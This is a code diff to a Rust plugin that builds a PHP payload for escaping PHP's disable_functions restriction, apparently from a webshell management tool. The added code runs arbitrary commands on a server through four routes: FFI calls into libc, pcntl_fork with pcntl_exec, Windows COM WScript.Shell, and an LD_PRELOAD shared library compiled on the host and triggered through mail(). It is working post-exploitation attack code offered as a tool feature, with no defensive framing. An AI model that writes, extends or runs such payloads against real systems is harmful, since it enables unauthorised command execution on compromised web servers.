@@ -1217,59 +1217,136 @@ fn php_bypass_disable_functions_code(command: &str) -> String {
         r#"<?php
 error_reporting(0);
 $cmd = {command};
-$out = array('disabled' => ini_get('disable_functions'), 'detected' => array(), 'result' => null);
+$out = array('disabled' => ini_get('disable_functions'), 'detected' => array(), 'vectors' => array(), 'result' => null);
 $disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
 $has = function ($fn) use ($disabled) {{
     return function_exists($fn) && !in_array($fn, $disabled);
 }};
-foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'putenv', 'mail', 'error_log', 'dl', 'FFI', 'iconv') as $fn) {{
+foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'putenv', 'mail', 'error_log', 'dl', 'FFI', 'iconv', 'pcntl_fork', 'pcntl_waitpid') as $fn) {{
     $out['detected'][$fn] = $has($fn);
 }}
-$cc = null;
-foreach (array('gcc', 'cc', 'clang') as $c) {{
-    $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
-    if (trim((string)$p)) {{ $cc = trim($p); break; }}
-}}
-$out['compiler'] = $cc;
 $tmp = sys_get_temp_dir();
-$hasShell = $has('shell_exec') || $has('exec') || $has('system');
-$sendmail = (string)ini_get('sendmail_path');
-if ($sendmail === '') $sendmail = '/usr/sbin/sendmail';
-$hasSendmail = @is_executable($sendmail) || @file_exists($sendmail);
-$out['sendmail'] = $hasSendmail ? $sendmail : null;
-if ($cc && $has('putenv') && ($has('mail') || $has('error_log')) && $hasShell && $hasSendmail) {{
-    $so = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.so';
-    $cf = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.c';
-    $of = $tmp . '/.dsw_out_' . mt_rand() . '_' . mt_rand() . '.txt';
-    $c = <<<'C'
+$of = $tmp . '/.dsw_bypass_' . mt_rand() . '_' . mt_rand() . '.txt';
+
+// ===== 向量 1：FFI（PHP 7.4+，无需编译器，直接调 libc） =====
+if (PHP_VERSION_ID >= 70400 && class_exists('FFI') && !in_array('FFI', $disabled)) {{
+    try {{
+        $lib = null;
+        foreach (array('libc.so.6', 'libc.so', '/lib/x86_64-linux-gnu/libc.so.6', '/usr/lib/libc.dylib') as $l) {{
+            try {{ $ffi = FFI::cdef("FILE *popen(const char *, const char *); char *fgets(char *, int, FILE *); int pclose(FILE *); int system(const char *);", $l); $lib = $l; break; }}
+            catch (Throwable $e) {{ continue; }}
+        }}
+        if ($lib !== null) {{
+            $fp = $ffi->popen($cmd . ' 2>&1', 'r');
+            if ($fp !== null) {{
+                $output = '';
+                $buf = $ffi->new("char[4096]");
+                while ($ffi->fgets($buf, 4095, $fp) !== null) {{ $output .= FFI::string($buf); }}
+                $ffi->pclose($fp);
+                $out['vectors']['ffi'] = array('ok' => true, 'lib' => $lib, 'output' => base64_encode($output));
+                $out['result'] = $output;
+            }} else {{
+                // popen 失败：退回 system + 临时文件
+                $ffi->system($cmd . ' > ' . $of . ' 2>&1');
+                if (file_exists($of)) {{
+                    $output = @file_get_contents($of);
+                    @unlink($of);
+                    $out['vectors']['ffi'] = array('ok' => true, 'method' => 'system', 'output' => base64_encode($output));
+                    $out['result'] = $output;
+                }}
+            }}
+        }}
+    }} catch (Throwable $e) {{
+        $out['vectors']['ffi'] = array('ok' => false, 'error' => $e->getMessage());
+    }}
+}}
+
+// ===== 向量 2：pcntl_exec（fork 子进程执行） =====
+if (!isset($out['result']) && $has('pcntl_exec') && $has('pcntl_fork') && $has('pcntl_waitpid')) {{
+    try {{
+        $pid = pcntl_fork();
+        if ($pid === 0) {{
+            pcntl_exec('/bin/sh', array('-c', $cmd . ' > ' . $of . ' 2>&1'));
+            exit;
+        }}
+        if ($pid > 0) {{
+            pcntl_waitpid($pid, $status);
+            $output = file_exists($of) ? @file_get_contents($of) : '';
+            @unlink($of);
+            $out['vectors']['pcntl_exec'] = array('ok' => true, 'output' => base64_encode((string)$output));
+            $out['result'] = $output;
+        }}
+    }} catch (Throwable $e) {{
+        $out['vectors']['pcntl_exec'] = array('ok' => false, 'error' => $e->getMessage());
+    }}
+}}
+
+// ===== 向量 3：COM / .NET（Windows） =====
+if (!isset($out['result']) && PHP_OS_FAMILY === 'Windows' && class_exists('COM')) {{
+    try {{
+        $wsh = new COM('WScript.Shell');
+        $wsh->Run('cmd /c ' . $cmd . ' > ' . $of . ' 2>&1', 0, true);
+        $output = file_exists($of) ? @file_get_contents($of) : '';
+        @unlink($of);
+        $out['vectors']['com'] = array('ok' => true, 'output' => base64_encode((string)$output));
+        $out['result'] = $output;
+    }} catch (Throwable $e) {{
+        $out['vectors']['com'] = array('ok' => false, 'error' => $e->getMessage());
+    }}
+}}
+
+// ===== 向量 4：LD_PRELOAD（编译器 + sendmail 触发） =====
+if (!isset($out['result'])) {{
+    $cc = null;
+    foreach (array('gcc', 'cc', 'clang') as $c) {{
+        $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
+        if (trim((string)$p)) {{ $cc = trim($p); break; }}
+    }}
+    $out['compiler'] = $cc;
+    $sendmail = (string)ini_get('sendmail_path');
+    if ($sendmail === '') $sendmail = '/usr/sbin/sendmail';
+    $hasSendmail = @is_executable($sendmail) || @file_exists($sendmail);
+    $out['sendmail'] = $hasSendmail ? $sendmail : null;
+    $hasShell = $has('shell_exec') || $has('exec') || $has('system');
+    if ($cc && $has('putenv') && ($has('mail') || $has('error_log')) && $hasShell && $hasSendmail) {{
+        $so = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.so';
+        $cf = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.c';
+        $c = <<<'C'
 __C_PAYLOAD__
 C;
-    @file_put_contents($cf, $c);
-    $built = @shell_exec($cc . ' -shared -fPIC -O2 -o ' . $so . ' ' . $cf . ' 2>&1');
-    if (file_exists($so)) {{
-        @putenv('EVIL_CMD=' . $cmd . ' > ' . $of . ' 2>&1');
-        @putenv('LD_PRELOAD=' . $so);
-        if ($has('mail')) {{ @mail('a@b.c', '', ''); }}
-        else {{ @error_log('', 1); }}
-        @putenv('LD_PRELOAD=');
-        $out['result'] = file_exists($of) ? @file_get_contents($of) : '(无输出：触发失败，可能无 sendmail)';
-        @unlink($so);
-        @unlink($cf);
-        @unlink($of);
+        @file_put_contents($cf, $c);
+        $built = @shell_exec($cc . ' -shared -fPIC -O2 -o ' . $so . ' ' . $cf . ' 2>&1');
+        if (file_exists($so)) {{
+            @putenv('EVIL_CMD=' . $cmd . ' > ' . $of . ' 2>&1');
+            @putenv('LD_PRELOAD=' . $so);
+            if ($has('mail')) {{ @mail('a@b.c', '', ''); }}
+            else {{ @error_log('', 1); }}
+            @putenv('LD_PRELOAD=');
+            $output = file_exists($of) ? @file_get_contents($of) : '';
+            $out['vectors']['ld_preload'] = array('ok' => true, 'output' => base64_encode((string)$output));
+            $out['result'] = $output;
+            @unlink($so);
+            @unlink($cf);
+            @unlink($of);
+        }} else {{
+            $out['vectors']['ld_preload'] = array('ok' => false, 'error' => 'compile failed: ' . (string)$built);
+        }}
     }} else {{
-        $out['error'] = '编译失败：' . (string)$built;
+        $out['vectors']['ld_preload'] = array('ok' => false,
+            'error' => '缺少条件：编译器(' . ($cc ?: '无') . ') sendmail(' . ($hasSendmail ? '有' : '无') . ') putenv/mail/exec');
     }}
-}} else {{
-    $out['error'] = '缺少绕过条件：需要 编译器 + putenv + mail/error_log + sendmail(' . ($hasSendmail ? '有' : '无') . ') + 任一命令执行函数';
+}}
+
+if (isset($out['result']) && $out['result'] === '') {{
+    $out['result'] = null;
+    $out['note'] = '命令执行成功但无输出';
 }}
 echo json_encode($out);
 "#,
         command = serde_json::to_string(command).unwrap_or_else(|_| "\"id\"".to_string()),
     )
     .replace("__C_PAYLOAD__", BYPASS_C_PAYLOAD)
-}
-
-/// BypassDisableFunctions（PHP 专用）：LD_PRELOAD + mail 经典绕过。
+}/// BypassDisableFunctions（PHP 专用）：LD_PRELOAD + mail 经典绕过。
 pub struct BypassDisableFunctionsPlugin;
 
 impl FeaturePlugin for BypassDisableFunctionsPlugin {
